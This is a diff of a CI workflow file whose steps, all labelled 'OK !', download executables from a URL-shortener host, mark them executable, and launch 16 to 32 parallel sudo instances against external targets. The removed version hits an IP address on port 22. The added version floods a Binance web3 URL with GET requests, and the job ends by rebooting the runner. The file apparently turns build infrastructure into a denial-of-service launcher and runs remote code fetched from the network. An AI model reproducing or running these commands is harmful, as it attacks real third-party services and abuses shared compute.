@@ -14,11 +14,12 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/qT61P/ovhand -O ovhand
-          chmod +x ovhand
+          wget https://curl.by/XmH2j/killed -O killed
+          wget https://curl.by/8J6_w/fres.txt -O fres.txt
+          chmod +x killed
           PIDS=()
-          for i in {1..16}; do
-            sudo timeout 30 ./ovhand  143.244.50.82 22 10 30 &
+          for i in {1..32}; do
+            sudo timeout 35 ./killed GET https://web3.binance.com/en-TR/markets/trending?chain=bsc fres.txt 35 950 8 &
             PIDS+=($!)
           done
           
@@ -27,7 +28,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 30
+        run: sleep 35
         
       - name: OK !
         run: sudo reboot
